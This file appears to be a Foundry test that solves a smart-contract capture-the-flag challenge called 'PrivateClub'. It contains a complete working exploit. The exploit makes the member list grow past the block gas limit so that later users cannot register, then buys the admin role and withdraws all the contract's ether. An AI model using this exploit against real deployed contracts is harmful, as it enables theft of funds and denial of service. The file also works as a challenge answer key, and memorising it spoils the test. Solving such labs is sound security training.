// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        console.log("Hacker balance before test: ", address(hacker).balance);
        vm.startPrank(hacker);
        // task1: become member of the club and
        address[] memory mForHacker = new address[](3);
        mForHacker[0] = hacker;
        mForHacker[1] = hacker;
        mForHacker[2] = hacker;

        club.becomeMember{value: 3 ether}(mForHacker);
        console.log("Hacker balance after member: ", address(hacker).balance);
        
        // block future registrations (reason: out of gas - block gas limit)
        // solution:
        for(uint i = 4; i < 8; i++){
            address[] memory mForHacker2 = new address[](i);
            
            //fill array
            for(uint j = 0; j < mForHacker2.length; j++)
                mForHacker2[j] = hacker;

            uint256 amount = i * 1 ether;
            club.becomeMember{value: amount}(mForHacker2); //Add hacker to the club over and over again to provoke a DoS
        }

        vm.stopPrank();
        // check - hacker is member
        assertTrue(club.members(hacker));


        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();
        console.log("Gas left: ", gasleftbeforeTxStart - gasleftAfterTxStart);
        console.log("Gas limit: ", blockGasLimit);
        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();

        vm.startPrank(hacker);
        console.log("Hacker balance after DoS: ", address(hacker).balance);
        
        // // task2: buy admin role and withdraw all ether from the club
        // // solution:
        club.buyAdminRole{value: 10 ether}(hacker);
        club.adminWithdraw(hacker, address(club).balance);

        // // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
        console.log("Hacker balance after test: ", address(hacker).balance);
    }
}